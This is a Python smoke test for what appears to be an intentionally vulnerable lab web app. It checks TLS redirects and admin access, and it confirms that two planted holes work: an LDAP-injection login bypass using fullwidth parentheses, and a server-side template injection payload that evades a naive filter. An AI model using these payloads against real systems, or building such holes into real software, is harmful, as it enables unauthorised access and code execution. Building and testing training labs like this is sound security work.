import os
import sys

import requests
import urllib3

# Spec S3: the app is reached through the TLS proxy on 443, not a published
# Flask port. The cert is self-signed and generated at image build time, so
# verification is off by default -- set SMOKE_VERIFY_TLS=1 if a deployment
# ever fronts this with a real certificate.
BASE_URL = os.environ.get("BASE_URL", "https://localhost")
VERIFY_TLS = os.environ.get("SMOKE_VERIFY_TLS", "").lower() in ("1", "true", "yes")

if not VERIFY_TLS:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(name, cond):
    status = "PASS" if cond else "FAIL"
    print(f"[{status}] {name}")
    if not cond:
        sys.exit(1)


def main():
    anon = requests.Session()
    anon.verify = VERIFY_TLS

    resp = anon.get(f"{BASE_URL}/login")
    check(
        "login page seeds the LDAP theme (spec S3)",
        resp.status_code == 200 and "ldap" in resp.text.lower(),
    )

    resp = anon.post(
        f"{BASE_URL}/login", data={"username": "administrator", "password": "wrong"}
    )
    check("plain wrong admin login rejected", resp.status_code == 401)

    session = requests.Session()
    session.verify = VERIFY_TLS
    resp = session.post(
        f"{BASE_URL}/login",
        data={
            "username": "administrator）（|（sAMAccountName=administrator",
            "password": "）",
        },
    )
    # Real AD reports the sAMAccountName with the directory's own casing
    # ("Administrator"), and the dashboard deliberately echoes the resolved
    # name rather than the submitted payload (spec S4.1). sAMAccountName is
    # case-insensitive in AD, so compare case-insensitively -- the ldap3
    # MOCK_SYNC backend Plan 1 verified against happened to return the
    # lowercase form, which is what made this assertion look exact.
    check(
        "verified OR-breakout payload authenticates as administrator over HTTPS",
        resp.status_code == 200 and "welcome, administrator" in resp.text.lower(),
    )
    check(
        "dashboard does not echo the injection payload back",
        ")(|(" not in resp.text and "sAMAccountName" not in resp.text,
    )

    resp = session.get(f"{BASE_URL}/admin/report-template")
    check("administrator can reach admin panel", resp.status_code == 200)

    resp = session.post(
        f"{BASE_URL}/admin/report-template", data={"template": "{{ ''.__class__ }}"}
    )
    check("naive SSTI payload blocked", resp.status_code == 400)

    resp = session.post(
        f"{BASE_URL}/admin/report-template",
        data={"template": "{{''['_'~'_cla'~'ss_'~'_']}}"},
    )
    check(
        "verified SSTI bypass renders class object over HTTPS",
        resp.status_code == 200 and "class 'str'" in resp.text,
    )

    # Spec S3's other half: 80 must redirect rather than serve. Only
    # meaningful when BASE_URL is the proxy, so it is skipped otherwise.
    if BASE_URL.startswith("https://"):
        plain = BASE_URL.replace("https://", "http://", 1)
        resp = requests.get(f"{plain}/login", allow_redirects=False, verify=VERIFY_TLS)
        check(
            "port 80 redirects to HTTPS",
            resp.status_code in (301, 302)
            and resp.headers.get("Location", "").startswith("https://"),
        )

    print("\nALL INTEGRATION CHECKS PASSED")


if __name__ == "__main__":
    main()
